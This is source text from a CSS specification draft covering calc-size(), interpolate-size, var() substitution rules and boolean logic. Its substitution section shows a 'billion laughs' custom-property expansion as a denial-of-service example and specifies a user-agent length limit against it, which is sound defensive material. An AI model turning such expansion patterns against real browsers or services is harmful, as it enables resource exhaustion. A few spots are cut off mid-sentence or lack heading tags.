	<details class=note>
		<summary>Why not just allow intrinsic keywords in ''calc()''?</summary>

		In theory, rather than introducing ''calc-size()'',
		we could have defined ''calc(auto * .5)'' to be valid,
		allowing interpolation to work as normal.

		This has the minor issue that mixing keywords still wouldn't be allowed,
		but it wouldn't be as obvious
		(that is, ''calc((min-content + max-content)/2)'' looks reasonable,
		but would be disallowed).

		The larger issue, tho,
		is that this wouldn't allow us to smoothly transition percentages.
		''calc(50%)'' is only half the size of ''calc(100%)''
		when percentages are [=definite=] in the context;
		if they're not, the two values will usually be the same size
		(depending on the context, either ''0px'' or ''width/auto''-sized).

		Using a new function that explicitly separates
		the size you're calculating with
		from the calculation itself
		lets us get smooth interpolation in <em>all</em> cases.

		An additional consideration is that there are many effects,
		some small and some large,
		that depend on whether an element is intrinsically sized
		or definite.
		Using ''calc()'' would mean that the answer to the question
		"is the element intrinsically-sized"
		can have one answer in the middle of a transition
		("yes", for ''calc(min-content * .2 + 20px * .8))''),
		but a different answer at the end of the transition
		("no", for ''calc(20px)''),
		causing the layout to jump at the end of an otherwise-smooth transition.

		(This is similar to the stacking-layer changes that can occur
		when animating from ''opacity:1'' to ''opacity: 0'';
		any non-''1'' value forces a stacking context.
		With 'opacity' you can get around this by animating to ''.999'',
		which is visually indistinguishable from ''1''
		but forces a stacking context.
		It's not as reasonable to ask people to animate to ''calc(auto * .0001)''
		to ensure it retains its intrinsic-ness.)

		Again, using a new function that identifies itself
		as being <em>inherently</em> an intrinsic size,
		like ''calc-size(auto, 20px)'',
		means we can maintain stable layout behaviors the entire time,
		even when the actual size is a definite length.
	</details>

<h3 id=simplifying-calc-size>
Simplifying ''calc-size()''</h3>

	Similar to [=math functions=],
	at both [=specified value=] and [=computed value=] times
	the [=calc-size calculation=]
	(and the [=calc-size basis=], if it's a <<calc-sum>>)
	are simplified to the extent possible,
	as defined in [[css-values-4#calc-simplification]].

	<div algorithm>
		To <dfn export for=calc-size()>canonicalize for interpolation</dfn>
		a ''calc-size()'' function:

		<dl class=switch>
			: If the [=calc-size basis=] is a ''calc-size()'' function itself
			:: The [=calc-size basis=] of the outer function
				is replaced with that of the inner function,
				and the inner function's [=calc-size calculation=]
				is [=substitute into a calc-size calculation|substituted=]
				into the outer function's [=calc-size calculation=].

			: Otherwise, if the [=calc-size basis=] is a <<calc-sum>> whose
				[=CSSNumericValue/type=] [=CSSNumericValue/matches=] <<length>>
				(no percentage present)
			:: Replace the basis with ''calc-size/any'',
				and the original basis is [=substitute into a calc-size calculation|substituted=]
				into the [=calc-size calculation=].

			: Otherwise, if the [=calc-size basis=] is any other <<calc-sum>>
				(contains a percentage)
			:: Replace the basis with ''100%''
				and the original basis is [=de-percentify a calc-size calculation|de-percentified=],
				then [=substitute into a calc-size calculation|substituted=]
				into the [=calc-size calculation=].
		</dl>

		(The above is performed recursively, if necessary.)

		If any [=substitute into a calc-size calculation=]
		returns failure,
		the entire operation immediately returns failure.

		Note: After canonicalization,
		a ''calc-size()'' function
		will only have a [=calc-size basis=] that's a keyword,
		or the value ''100%''.
	</div>

	<details class=note>
		<summary>Why are percentages simplified in this way?</summary>

		This percentage simplification
		ensures that transitions work linearly.

		For example, say that 100% is 100px, for simplicity.

		If you transitioned from `calc-size(100px, size * 2)`
		(resolves to 200px)
		to `calc-size(50%, size - 20px)`
		(resolves to 30px)
		by interpolating both the arguments,
		then at the halfway point
		you'd have `calc-size(75px, size * 2 * .5 + (size - 20px) * .5)`
		(resolves to 102.5px),
		which is *not* halfway between 30 and 200
		(that would be 115px).
		Interpolating one argument,
		then substituting it into another calculation
		and interpolating that one too,
		generally gives <em>quadratic</em> interpolation behavior.

		Instead, we substitute the basis arg into the calculation arg,
		so you get `calc-size(percentage, 100px * 2)`
		and `calc-size(percentage, (size * .5) - 20px)`,
		and when interpolated,
		at the halfway point you get
		`calc-size(percentage, 100px * 2 * .5 + ((size * .5) - 20px) * .5)`,
		which does indeed resolve to 115px, as expected.
		Other points in the transition are similarly linear.

	<div algorithm>
		To <dfn export>de-percentify a calc-size calculation</dfn> |calc|:

		1. Replace every instance of a <<percentage-token>> in |calc|
			with ''(size * N)'',
			where N is the percentage's value divided by 100.
			Return |calc|.

		Note: For example,
		''50% + 20px''
		becomes ''(size * .5) + 20px''.
	</div>

	<div algorithm>
		To <dfn export>substitute into a calc-size calculation</dfn> |calc|
		a value |insertion value|:

		1. If |calc| doesn't have the ''calc-size()/size'' keyword in it,
			do nothing.

		2. Otherwise, replace every instance of the ''calc-size()/size'' keyword
			in |calc|
			with |insertion value|,
			wrapped in parentheses.

		3. If this substitution would produce a value
			larger than an UA-defined limit,
			return failure.

			Note: This is intentionally identical
			to the protection against substitution attacks
			defined for variable substitution;
			see [[css-variables-1#long-variables]].
			However, the use-cases for very long ''calc-size()'' values

<h3 id=resolving-calc-size>
Resolving ''calc-size()''</h3>

	A ''calc-size()'' is treated, in all respects,
	as if it were its [=calc-size basis=]
	(with ''calc-size()/any'' acting as an unspecified [=definite=] size).

	When actually performing layout calculations, however,
	the size represented by its [=calc-size basis=]
	is modified to be the value of its [=calc-size calculation=],
	with the ''calc-size()/size'' keyword
	evaluating to the [=calc-size basis's=] original size.

	(If the [=calc-size basis=] is <dfn for="calc-size()" value>any</dfn>,
	the ''calc-size()'' is a [=definite=] length,
	equal to its [=calc-size calculation=].)

	<div class=example>
		For example,
		an element with ''height: calc-size(auto, round(up, size, 20px))''
		will be treated identically to an element with ''height: auto'',
		but with its size rounded up to the nearest multiple of ''20px''.
	</div>

	When evaluating the [=calc-size calculation=],
	if percentages are not definite in the given context,
	they resolve to ''0px''.
	Otherwise, they resolve as normal.

	(A percentage in the [=calc-size basis=]
	is treated differently;
	[[#simplifying-calc-size|simplification]]
	moves the percentage into the [=calc-size calculation=]
	and replaces it with ''size'' references.
	The [=calc-size basis=] then becomes ''100%'',
	behaving as whatever ''100%'' would normally do in that context,
	including possibly making a property [=behave as auto=], etc.)

	<div class=note>
		Percentages in the basis work as normal
		so you can always smoothly transition to <em>any</em> size,
		regardless of its value or behavior.
		For example, without ''calc-size()'',
		transitioning from ''100%'' to ''0px''
		only works smoothly if the percentage is [=definite=];
		if it's not, then during the entire transition
		the property might [=behave as auto=]
		and not actually change size at all.

		Percentages in the calculation, on the other hand,
		are resolved to 0 when indefinite
		to avoid making the ''calc-size()''
		potentially act in two different ways;
		there are some cases where a ''width/min-content'' size
		will cause different layout effects than a ''100%'' size,
		and so a ''calc-size()'' has to masquerade as one or the other.
	</div>


<h3 id=interp-calc-size>
Interpolating ''calc-size()''</h3>

	Two ''calc-size()'' functions can be interpolated if
	(after being [=canonicalized for interpolation=]):

	<dl class=switch>
		: Either function returned failure from being [=canonicalized for interpolation=]
		:: The values cannot be interpolated.

		: Both [=calc-size basises=] are identical
		:: The result's [=calc-size basis=] is the that basis value.

		: Either [=calc-size basis=] is ''calc-size()/any''
		:: The result's [=calc-size basis=] is the non-''calc-size()/any'' basis.
	</dl>

	The result's [=calc-size calculation=]
	is the interpolation of the two input [=calc-size calculations=].

	Note: These interpolation restrictions ensure that a ''calc-size()''
	doesn't try to act in two different ways at once;
	there are some cases where a ''width/min-content'' and ''width/max-content''
	would produce different layout behaviors, for example,
	so the ''calc-size()'' has to masquerade as one or the other.
	This, unfortunately, means you can't transition between keywords,
	like going from ''width/auto'' to ''width/min-content''.

	Some ''calc-size()'' values can also be interpolated
	with a <<length-percentage>> or an <<intrinsic-size-keyword>>.
	To determine whether the values can interpolate
	and what the interpolation behavior is,
	treat the non-''calc-size()'' value
	as ''calc-size(any,  <var ignore>value</var> )'' if the value is a <<calc-sum>>
	or as ''calc-size( <var ignore>value</var> , size)'' otherwise,
	and apply the rules above.

	<div class=example>
		For example, ''calc-size()'' allows interpolation to/from ''height: auto'':

		<pre class=lang-css>
		details {
			transition: height 1s;
		}
		details::details-content {
			display: block;
		}
		details[open]::details-content {
			height: auto;
		}
		details:not([open])::details-content {
			height: calc-size(any, 0px);
		}
		</pre>

		This will implicitly interpolate
		between ''calc-size(auto, size)'' and ''calc-size(any, 0px)''.
		Half a second after opening the <{details}>,
		the ::details-content wrapper's 'height'
		will be ''calc-size(auto, size * .5)'',
		half its open size;
		thruout the transition it'll smoothly animate its height.
	</div>

	Note: ''calc-size()'' is designed such that
	transitioning to/from ''calc-size(any, [=definite=] length)''
	will <em>always</em> work smoothly,
	regardless of how the other side of the transition is specified.

	Note: This "upgrade a plain value into a ''calc-size()''" behavior
	puts <<length-percentage>> values into the [=calc-size calculation=].
	This allows values with percentages
	to interpolate with intrinsic size keywords,
	but does mean that when a percentage isn't [=definite=],
	it'll resolve to zero.
	If you want to resolve to the actual size the percentage would make the element,
	explicitly write a ''calc-size()''
	with the value in its [=calc-size basis=],
	like ''calc-size(50%, size)''.


<h3 id=interpolate-size>
Interpolating sizing keywords: the 'interpolate-size' property</h3>

	Note: If we had a time machine, this property wouldn't need to exist.
	It exists because many existing style sheets assume that
	intrinsic sizing keywords
	(such as ''width/auto'', ''width/min-content'', etc.)
	cannot animate.
	Therefore this property exists to allow style sheets to choose
	to get the expected behavior.
	Specifying ''interpolate-size: allow-keywords'' on the root element
	chooses the new behavior for the entire page.
	We suggest doing this whenever compatibility isn't an issue.

	<pre class="propdef">
	Name: interpolate-size
	Value: numeric-only | allow-keywords
	Initial: numeric-only
	Inherited: yes
	Applies to: all elements
	Computed value: as specified
	Animation type: not animatable
	</pre>

	<dl dfn-for="interpolate-size" dfn-type="value">
		<dt><dfn>numeric-only</dfn>
		<dd>
			An <<intrinsic-size-keyword>> cannot be interpolated.
		</dd>

		<dt><dfn>allow-keywords</dfn>
		<dd>
			Two values can also be interpolated if
			one of them is an <<intrinsic-size-keyword>>
			and the other is a <<length-percentage>>.
			This is done by treating
			the <<intrinsic-size-keyword>> <var>keyword</var>
			as though it is ''calc-size(<var>keyword</var>, size)''
			and applying the rules in [[#interp-calc-size]].
			In other cases,
			an <<intrinsic-size-keyword>> still cannot be interpolated.
		</dd>
	</dl>

	The value of 'interpolate-size' that matters
	is the computed value on the element
	at the time the animation might start.
	For CSS transitions,
	this means the value in the [=after-change style=].
	An animation is not stopped or started later
	because 'interpolate-size' changes.

<h2 id=arbitrary-substitution>
Appendix A: Arbitrary Substitution Functions</h2>

	An <dfn export>arbitrary substitution function</dfn>
	is a [=functional notation=] that will,
	when resolved,
	substitute itself with other values
	that are potentially unknowable at parse time--
	and must therefore be parsed while resolving its [=computed value=].

	Note: Since [=arbitrary substitution functions=] resolve at [=computed value=] time,
	if the resulting value after substitution is invalid,
	the property falls back (essentially) to ''unset'' behavior,
	rather than falling back to an earlier value in the [=cascade=]
	the way declarations invalid at parse time do.
	See [[#invalid-substitution]].

	Unless otherwise specified,
	[=arbitrary substitution functions=] can be used
	in place of any part of any property's value
	(including within other [=functional notations=]);
	and are not valid in any other context.

	ISSUE: Should any of these functions be valid in contexts outside of properties?

	<wpt pathprefix="css/css-variables">
	variable-external-font-face-01.html
	variable-font-face-01.html
	variable-font-face-02.html
	</wpt>

	<div class='example'>
		For example, the following code incorrectly attempts to use a variable as a property name:

		<pre>
		.foo {
			--side: margin-top;
			var(--side): 20px;
		}
		</pre>

		This is <em>not</em> equivalent to setting ''margin-top: 20px;''.
		Instead, the second declaration is simply thrown away as a syntax error
		for having an invalid property name.
	</div>

	If a property value contains one or more [=arbitrary substitution functions=],
	and those functions are themselves syntactically valid,
	the entire value's grammar must be assumed to be valid at parse time.

	<wpt pathprefix="css/css-variables">
	variable-reference-18.html
	variable-reference-19.html
	variable-reference-30.html
	</wpt>

	[=Arbitrary substitution functions=] are [=substituted=]
	during style [=computed value|computation=],
	before any other value transformations or introspection can occur.
	If a property,
	after [=substitution=],
	does not match its declared grammar,
	the declaration is [=invalid at computed-value time=].

	<wpt pathprefix="css/css-variables">
	variable-declaration-16.html

	variable-declaration-21.html
	variable-transitions-transition-property-all-before-value.html
	variable-transitions-value-before-transition-property-all.html
	</wpt>

	If a property value,
	after [=substitution=],
	contains only a single [=CSS-wide keyword=]
	(and possibly whitespace/comments),
	its value is determined as if that keyword were its [=specified value=] all along.

	<wpt pathprefix="css/css-variables">
	whitespace-in-fallback-crash.html
	wide-keyword-fallback-001.html
	wide-keyword-fallback-002.html
	</wpt>

	<div class='example'>
		For example,
		the following usage is fine from a syntax standpoint,
		but results in nonsense when the variable is substituted in:

		<pre>
		:root { --looks-valid: 20px; }
		p { background-color: var(--looks-valid); }
		</pre>

		Since ''20px'' is an invalid value for 'background-color',
		the property becomes [=invalid at computed-value time=],
		and instead resolves to ''transparent''
		(the [=initial value=] for 'background-color').

		If the property was one that's inherited by default,
		such as 'color!!property',
		it would compute to the inherited value
		rather than the initial value.
	</div>

	<div class='example'>
		While a ''var()'' function can't get a [=CSS-wide keyword=]
		from the [=custom property=] itself--
		if you tried to specify that,
		like ''--foo: initial;'',
		it would just trigger [[css-cascade-4#defaulting-keywords|explicit defaulting]]
		for the custom property--
		it can have a [=CSS-wide keyword=] in its fallback:

		<pre>
		p { color: var(--does-not-exist, initial); }
		</pre>

		In the above code, if the ''--does-not-exist'' property didn't exist
		or is [=invalid at computed-value time=],
		the ''var()'' will instead substitute in the ''initial'' keyword,
		making the property behave as if it was originally ''color: initial''.
		This will make it take on the document's initial 'color' value,
		rather than defaulting to inheritance,
		as it would if there were no fallback.
	</div>

	Each [=arbitrary substitution function=]
	must define how to <dfn export>resolve an arbitrary substitution function</dfn>
	for itself,
	returning optional |result| and |fallback| values.
	The |result| is used to replace the function
	as long as it does not contain the [=guaranteed-invalid value=];
	the |fallback| is used otherwise.
	(The |fallback| does not need to be resolved in any way;
	[=substitution=] will handle that if it's actually used.)

	Note: See, for example, [=resolve a var() function=].

	<div algorithm>
		To <dfn export local-lt="substitute|substitution" lt="substitute arbitrary substitution function|arbitrary substitution">substitute arbitrary substitution functions</dfn> in a |value|:

		1. [=list/For each=] [=arbitrary substitution function=] |func|
			in |value|:

			1. [=Resolve=] |func|.
				Let |result| be the returned result,
				and |fallback| be the returned fallback.

				If no |result| was returned,
				set |result| to the [=guaranteed-invalid value=].
				If no |fallback| was returned,
				set |fallback| to the [=guaranteed-invalid value=].

			2. <dl class=switch>
					: If |result| does not contain the [=guaranteed-invalid value=]
					:: Replace |func| in |value| with |result|.
					: Otherwise, if |fallback| does not contain the [=guaranteed-invalid value=]
					:: Replace |func| in |value| with |fallback|.
					: Otherwise
					:: Replace all of |value| with the [=guaranteed-invalid value=].
						Exit this algorithm.
				</dl>

		2. If there are still [=arbitrary substitution functions=]
			in |value| (due to substitution),
			repeat the previous step.

		3. Grammar-check |value| according to its context as normal.
			If it is not valid at this point,
			replace |value| with the [=guaranteed-invalid value=].

		Note that [=substitution=] takes place at the level of CSS tokens [[css-syntax-3]],
		not at a textual level;
		you can't build up a single token where part of it is provided by a variable:

		<pre>
		.foo {
			--gap: 20;
			margin-top: var(--gap)px;
		}
		</pre>

		This is <em>not</em> equivalent to setting ''margin-top: 20px;'' (a length).
		Instead, it's equivalent to ''margin-top: 20 px;'' (a number followed by an ident),
		which is simply an invalid value for the 'margin-top' property.
		Note, though, that ''calc()'' can be used to validly achieve the same thing, like so:

		<pre>
		.foo {
		  --gap: 20;
		  margin-top: calc(var(--gap) * 1px);
		}
		</pre>

		This also implies that the post-substitution value
		might not be directly serializable as-is.
		Here's a similar example to the preceding:

		<pre>
		.foo {
			--gap: 20;
			--not-px-length: var(--gap)px;
		}
		</pre>

		The serialization of the computed (post-substitution)
		value of ''--not-px-length''
		is <strong>not</strong> ''20px'',
		because that would parse back as the single combined dimension;
		instead, it will serialize with a comment between the two tokens,
		like ''20/**/px'',
		to enforce that they are separate tokens even when re-parsing.

Invalid Substitution</h3>

	When [=substitution=] results in a property's value
	containing the [=guaranteed-invalid value=],
	this makes the declaration <dfn export>invalid at computed-value time</dfn>.
	When this happens,
	the computed value is one of the following
	depending on the property's type:

	<dl class="switch">
		:   The property is a non-registered [=custom property=]
		:   The property is a [=registered custom property=]
		    with [=universal syntax definition|universal syntax=]
		::  The computed value is the <a>guaranteed-invalid value</a>.

		:   Otherwise
		::  Either the property's inherited value
		    or its initial value
		    depending on whether the property is inherited or not, respectively,
		    as if the property's value had been specified as the ''unset'' keyword.
	</dl>

	<wpt pathprefix="css/css-variables">
	variables-substitute-guaranteed-invalid.html
	</wpt>

	<div class='example'>
		For example, in the following code:

		<pre>
		:root { --not-a-color: 20px; }
		p { background-color: red; }
		p { background-color: var(--not-a-color); }
		</pre>

		the &lt;p> elements will have transparent backgrounds
		(the initial value for 'background-color'),
		rather than red backgrounds.
		The same would happen if the <a>custom property</a> itself was unset,
		or contained an invalid ''var()'' function.

		Note the difference between this
		and what happens if the author had just written ''background-color: 20px'' directly in their stylesheet -
		that would be a normal syntax error,
		which would cause the rule to be discarded,
		so the ''background-color: red'' rule would be used instead.
	</div>

	Note: The <a>invalid at computed-value time</a> concept exists
	because [=arbitrary substitution functions=] can't "fail early" like other syntax errors can,
	so by the time the user agent realizes a property value is invalid,
	it's already thrown away the other cascaded values.

Substitution in Shorthand Properties</h3>

	[=Arbitrary substitution functions=] produce some complications
	when parsing [=shorthand properties=] into their component longhands,
	and when serializing [=shorthand properties=] <em>from</em> their component longhands.

	If a [=shorthand property=] contains an [=arbitrary substitution function=] in its value,
	the [=longhand properties=] it's associated with must instead be filled in
	with a special, unobservable-to-authors <dfn export>pending-substitution value</dfn>
	that indicates the shorthand contains an [=arbitrary substitution function=],
	and thus the longhand's value can't be determined until after [=substituted=].

	This value must then be cascaded as normal,
	and at computed-value time,
	after [=substitution=],
	the shorthand must be parsed
	and the longhands must be given their appropriate values at that point.

	<wpt pathprefix="css/css-variables">

	variable-substitution-shorthands.html
	vars-background-shorthand-001.html
	vars-font-shorthand-001.html
	</wpt>

	Note: When a shorthand is written without an [=arbitrary substitution function=],
	it is parsed and separated out into its component [=longhand properties=] at parse time;
	the longhands then participate in the [=cascade=],
	with the [=shorthand property=] more or less discarded.
	When the shorthand contains a ''var()'', however,
	this can't be done,
	as the ''var()'' could be substituted with anything.

	[=Pending-substitution values=] must be serialized as the empty string,
	if an API allows them to be observed.

	----

	[=Shorthand properties=] are serialized
	by gathering the values of their component [=longhand properties=],
	and synthesizing a value
	that will parse into the same set of values.

	If all of the component [=longhand properties=] for a given [=shorthand=]
	are [=pending-substitution values=]
	from the same original shorthand value,
	the [=shorthand property=] must serialize to that original
	([=arbitrary substitution function=]-containing)
	value.

	Otherwise,
	if any of the component [=longhand properties=] for a given [=shorthand=]
	are [=pending-substitution values=],
	or contain [=arbitrary substitution functions=] of their own that have not yet been [=substituted=],
	the [=shorthand property=] must serialize to the empty string.

<h3 id=long-substitution oldids=long-variables>
Safely Handling Overly-Long Substitution</h3>

	Naively implemented,
	some [=arbitrary substitution functions=]
	(such as ''var()'')
	can be used in a variation of the "billion laughs attack":

	<div class=example>
		<pre lang=css>
		.foo {
			--prop1: lol;
			--prop2: var(--prop1) var(--prop1);
			--prop3: var(--prop2) var(--prop2);
			--prop4: var(--prop3) var(--prop3);
			/* etc */
		}
		</pre>

		In this short example, ''--prop4''’s computed value is ''lol lol lol lol lol lol lol lol'',
		containing 8 copies of the original ''lol''.
		Every additional level added to this doubles the number of identifiers;
		extending it to a mere 30 levels,
		the work of a few minutes by hand,
		would make ''--prop30'' contain <em>nearly a billion instances</em> of the identifier.
	</div>

	To avoid this sort of attack,
	UAs must impose a UA-defined limit on the allowed length of the token stream
	that an [=arbitrary substitution function=] expands into.
	If an [=arbitrary substitution function=] would expand into a longer token stream than this limit,
	it instead is replaced with the [=guaranteed-invalid value=].

	<wpt pathprefix="css/css-variables">
	long-variable-reference-crash.html
	variable-exponential-blowup.html
	</wpt>

	This specification does not define what size limit should be imposed.
	However, since there are valid use-cases for custom properties that contain a kilobyte or more of text,
	it's recommended that the limit be set relatively high.

	Note: The general principle that UAs are allowed to violate standards due to resource constraints
	is still generally true here;
	a UA might, separately, have limits on how long of a custom property they can support,
	or how large of an identifier they can support.
	This section calls out this attack specifically
	because of its long history,
	and the fact that it can be done without any of the pieces
	<em>seeming</em> to be too large on first inspection.

<h2 id="boolean-logic">
Appendix B: Boolean Logic</h2>

	In order to accommodate future extensions of CSS,
	<<boolean-expr[]>> productions generally interpret their <<general-enclosed>> grammar branch as unknown,
	and their boolean logic is resolved using 3-value Kleene logic.
	In some cases (such as ''@supports''),
	<<general-enclosed>> is instead defined as false;
	in which case the logic devolves to standard boolean algebra.

	3-value boolean logic is applied recursively
	to a boolean condition |test| as follows:

	* A leaf-level |test| resolves to
		true, false, or unknown,
		as defined by the relevant specification.

	* ''not |test|'' evaluates to
		true if its contained |test| is false,
		false if it's true,
		and unknown if it's unknown.

	* Multiple |test|s connected with ''and'' evaluate to
		true if <em>all</em> of those |test|s are true,
		false if <em>any</em> of them are false,
		and unknown otherwise (i.e. if at least one unknown, but no false).

	* Multiple |test|s connected with ''or'' evaluate to
		true if <em>any</em> of those |test|s are true,
		false if <em>all</em> of them are false,
		and unknown otherwise (i.e. at least one unknown, but no true).

	If a “top-level” <<boolean-expr[]>> is unknown,
	and the containing context doesn't otherwise define
	how to handle unknown conditions,
	it evaluates to false.

	Note: That is, unknown doesn't “escape” a 3-value boolean expression
	unless explicitly handled,
	similar to how <code>NaN</code> doesn't “escape” a [=top-level calculation=]).

	Changes since the <a href="https://www.w3.org/TR/2024/WD-css-values-5-20240913/">First Public Working Draft</a> include:

	* Incorporated the definition of <<position>>,
		extending it to handle [=flow-relative=] positions.
		(<a href="https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623">Issue 549</a>)

<h3 class=no-num id="additions-L4">
Additions Since Level 4</h3>

	Additions since <a href="http://www.w3.org/TR/css-values-4/">CSS Values and Units Level 4</a>:

	* Added the “comma-wrapping” ''{}'' notation for function arguments.
	* Defined several <<url-modifier>>s for <<url>> functions.
	* Extended <<position>> to handle [=flow-relative=] positions.
		(<a href="https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623">Issue 549</a>)
	* Added the [[#progress|*-progress()]] family of functions, to represent interpolation progress between two values.
	* Added the [[#mixing|*-mix()]] family of functions, to represent actually interpolating between two values.
	* Added ''first-valid()'', to allow CSS's forward-compatible parsing behavior (drop invalid things, go with what's left) to be used with custom properties and other contexts where validity isn't known until <em>after</em> parsing.
	* Added ''if()'' for inline conditionals.
	* Added ''inherit()''.
	* Added the ''toggle()'' and ''attr()'' functions.
	* Added the ''random()'' and ''random-item()'' functions.
	* Added the ''sibling-count()'' and ''sibling-index()'' functions.
	* Added the ''calc-size()'' function, and the related 'interpolate-size' property.
	* Added the <<boolean-expr[]>> syntax notation to the [=value definition syntax=].


<h2 class="no-num" id="security">
Security Considerations</h2>

	This specification allows CSS <<url>> values to have various aspects of their request modified.
	Although this is new to CSS,
	every ability is already present in <{img}> or <{link}>, as well as via JavaScript.

	The ''attr()'' function allows HTML attribute values
	to be used in CSS values,
	potentially exposing sensitive information
	that was previously not accessible via CSS.
	See [[#attr-security]].

<h2 class="no-num" id="privacy">
Privacy Considerations</h2>

	This specification defines units that expose the user's screen size
	and default font size,
	but both are trivially observable from JS,
	so they do not constitute a new privacy risk.
	Similarly the ''media-progress()'' notation exposes
	information about the user's environment and preferences
	that are already observiable via [=media queries=].

	The ''attr()'' function allows HTML attribute values
	to be used in CSS values,
	potentially exposing sensitive information
	that was previously not accessible via CSS.
	See [[#attr-security]].
